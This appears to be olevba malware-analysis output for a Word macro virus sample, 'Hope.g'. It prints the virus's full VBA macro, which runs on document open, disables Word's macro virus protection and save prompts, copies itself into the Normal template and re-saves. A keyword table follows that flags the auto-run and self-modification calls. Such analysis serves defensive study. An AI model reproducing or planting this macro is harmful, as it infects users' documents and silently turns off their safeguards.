olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hope.g-fe61f2bf416bd18d574bef65d18d3c91f5c35e99
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hope.g-fe61f2bf416bd18d574bef65d18d3c91f5c35e99 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open(): Options.VirusProtection = 0: Options.ConfirmConversions = 0: Options.SaveNormalPrompt = 0: A = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1): NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines: NormalTemplate.VBProject.Description = A: NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString ThisDocument.VBProject.Description: ActiveDocument.SaveAs FileName:=ActiveDocument.FullName: End Sub 'Dead-Dog By Lys Kovick
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

